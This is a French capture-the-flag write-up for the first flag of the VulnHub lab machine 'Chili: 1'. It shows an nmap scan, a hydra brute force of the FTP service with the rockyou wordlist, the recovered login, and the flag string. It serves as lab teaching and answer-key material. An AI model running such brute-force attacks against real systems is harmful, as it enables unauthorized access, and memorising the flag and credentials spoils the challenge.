# Writeup : cible1 (1/2) — accès initial

La cible est la machine VulnHub **Chili: 1** (SunCSR Team), avec des flags personnalisés pour
le CTF. Ce writeup couvre le premier flag (`/home/flag.txt`) ; la suite (root) est dans
[`../../cible1-root/solution/writeup.md`](../../cible1-root/solution/writeup.md).

## 1. Énumération

```console
$ nmap -sV -p- 192.168.10.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

Le site web n'affiche qu'une page « Chili » sans fonctionnalité. Le nom de la machine
(« chili ») est le candidat évident comme nom d'utilisateur FTP.

## 2. Bruteforce FTP

L'énoncé insiste sur les mots de passe faibles « savoureux » : on attaque le FTP avec rockyou.

```console
$ hydra -l chili -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.2
[21][ftp] host: 192.168.10.2   login: chili   password: a1b2c3d4
```

## 3. Accès FTP et flag

```console
$ ftp 192.168.10.2      # chili / a1b2c3d4
ftp> cd /home
ftp> get flag.txt
```

L'utilisateur FTP n'est pas chrooté : il peut parcourir toute l'arborescence, dont `/home` et
`/var/www/html` (utile pour la suite).

## Flag

`FPS{ch1li_ftp_r1pe_4a7f}`
